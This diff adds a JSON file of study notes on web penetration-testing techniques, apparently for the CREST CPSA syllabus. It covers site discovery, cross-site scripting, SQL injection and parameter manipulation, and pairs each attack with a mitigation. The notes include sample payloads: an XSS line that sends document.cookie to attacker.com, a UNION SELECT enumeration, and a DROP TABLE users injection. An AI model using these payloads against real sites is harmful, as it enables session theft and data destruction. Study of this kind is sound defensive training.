@@ -1,0 +1,37 @@
+{
+  "title": "Appendix I: Web Testing Techniques",
+  "letter": "I",
+  "content": "Appendix I: Web Testing Techniques\nI1 Web Site Structure Discovery\nSpidering Tools and Their Relevance:\n• Spidering Tools:\n• Example Tools: Burp Suite Spider, OWASP ZAP Spider, Screaming Frog SEO Spider.\n• Relevance: These tools crawl through the web application, discovering and mapping the\nsite's structure, including linked pages, directories, and parameters.\nForced Browsing Techniques:\n• Forced Browsing:\n• Description: Manually or programmatically attempting to access URLs that are not\nlinked from the main application but might exist.\n• Techniques:\n• Iterative testing of predictable URLs (e.g., /admin, /backup).\n• Attempting to access default or hidden directories.\nIdentification of Functionality Within Client-Side Code:\n• Client-Side Code Analysis:\n• Techniques:\n• Analyzing JavaScript files to identify functions, endpoints, and interactions.\n• Inspecting HTML source for embedded scripts or AJAX requests.\n\nI2 Cross-Site Scripting Attacks\nArbitrary JavaScript Execution:\n• Example Scenario:\n• Payload: <script>alert('XSS')</script>\n• Impact: Displaying an alert box with the text 'XSS'.\n• Mitigation: Implement proper input validation and output encoding.\nUsing XSS to Obtain Sensitive Information:\n• Example Scenario:\n• Payload: <img src='http://attacker.com/collect?cookie=' + document.cookie'>\n• Impact: Sending user's cookie to the attacker's server.\n• Mitigation: Implement secure coding practices and Content Security Policy (CSP).\nPhishing Techniques:\n• Phishing with XSS:\n• Example Scenario:\n• Injecting a phishing form into a legitimate site.\n• Capturing login credentials.\n• Mitigation: Regularly audit and sanitize user inputs to prevent injection.\n\nI3 SQL Injection\nDetermine the Existence of SQL Injection Conditions:\n• Example Testing:\n• Payload: ' OR 1=1 -• Observation: If the page behaves differently, it may be vulnerable.\n• Mitigation: Use parameterized queries or prepared statements.\nExploit SQL Injection to Enumerate the Database:\n• Example Payload:\n• UNION SELECT table_name, column_name FROM information_schema.columns -• Outcome: Retrieving information about tables and columns.\n• Mitigation: Implement proper input validation and avoid dynamic queries.\nExploit SQL Injection to Execute Commands:\n• Example Payload:\n• ; DROP TABLE users -• Outcome: Deleting the \"users\" table.\n• Mitigation: Implement strict access controls and avoid dynamic SQL queries.\n\nI4 Missing from the official CREST CPSA syllabus document.\nI5 Missing from the official CREST CPSA syllabus document.\nI6 Parameter Manipulation\nParameter Manipulation Techniques:\n• Client-Side Proxies:\n• Description: Intercepting and modifying requests and responses between the client and\nserver.\n• Tools: Burp Suite, OWASP ZAP.\n• Techniques: Altering parameter values, testing for security flaws.\nParameters that could be manipulated\nCookies\nForm Fields\nURL Query Strings\nHTTP Headers",
+  "sections": [
+    {
+      "id": "I1",
+      "title": "I1 Web Site Structure Discovery",
+      "content": "I1 Web Site Structure Discovery\nSpidering Tools and Their Relevance:\n• Spidering Tools:\n• Example Tools: Burp Suite Spider, OWASP ZAP Spider, Screaming Frog SEO Spider.\n• Relevance: These tools crawl through the web application, discovering and mapping the\nsite's structure, including linked pages, directories, and parameters.\nForced Browsing Techniques:\n• Forced Browsing:\n• Description: Manually or programmatically attempting to access URLs that are not\nlinked from the main application but might exist.\n• Techniques:\n• Iterative testing of predictable URLs (e.g., /admin, /backup).\n• Attempting to access default or hidden directories.\nIdentification of Functionality Within Client-Side Code:\n• Client-Side Code Analysis:\n• Techniques:\n• Analyzing JavaScript files to identify functions, endpoints, and interactions.\n• Inspecting HTML source for embedded scripts or AJAX requests."
+    },
+    {
+      "id": "I2",
+      "title": "I2 Cross-Site Scripting Attacks",
+      "content": "I2 Cross-Site Scripting Attacks\nArbitrary JavaScript Execution:\n• Example Scenario:\n• Payload: <script>alert('XSS')</script>\n• Impact: Displaying an alert box with the text 'XSS'.\n• Mitigation: Implement proper input validation and output encoding.\nUsing XSS to Obtain Sensitive Information:\n• Example Scenario:\n• Payload: <img src='http://attacker.com/collect?cookie=' + document.cookie'>\n• Impact: Sending user's cookie to the attacker's server.\n• Mitigation: Implement secure coding practices and Content Security Policy (CSP).\nPhishing Techniques:\n• Phishing with XSS:\n• Example Scenario:\n• Injecting a phishing form into a legitimate site.\n• Capturing login credentials.\n• Mitigation: Regularly audit and sanitize user inputs to prevent injection."
+    },
+    {
+      "id": "I3",
+      "title": "I3 SQL Injection",
+      "content": "I3 SQL Injection\nDetermine the Existence of SQL Injection Conditions:\n• Example Testing:\n• Payload: ' OR 1=1 -• Observation: If the page behaves differently, it may be vulnerable.\n• Mitigation: Use parameterized queries or prepared statements.\nExploit SQL Injection to Enumerate the Database:\n• Example Payload:\n• UNION SELECT table_name, column_name FROM information_schema.columns -• Outcome: Retrieving information about tables and columns.\n• Mitigation: Implement proper input validation and avoid dynamic queries.\nExploit SQL Injection to Execute Commands:\n• Example Payload:\n• ; DROP TABLE users -• Outcome: Deleting the \"users\" table.\n• Mitigation: Implement strict access controls and avoid dynamic SQL queries."
+    },
+    {
+      "id": "I4",
+      "title": "I4 Missing from the official CREST CPSA syllabus document.",
+      "content": "I4 Missing from the official CREST CPSA syllabus document."
+    },
+    {
+      "id": "I5",
+      "title": "I5 Missing from the official CREST CPSA syllabus document.",
+      "content": "I5 Missing from the official CREST CPSA syllabus document."
+    },
+    {
+      "id": "I6",
+      "title": "I6 Parameter Manipulation",
+      "content": "I6 Parameter Manipulation\nParameter Manipulation Techniques:\n• Client-Side Proxies:\n• Description: Intercepting and modifying requests and responses between the client and\nserver.\n• Tools: Burp Suite, OWASP ZAP.\n• Techniques: Altering parameter values, testing for security flaws.\nParameters that could be manipulated\nCookies\nForm Fields\nURL Query Strings\nHTTP Headers"
+    }
+  ]
+}
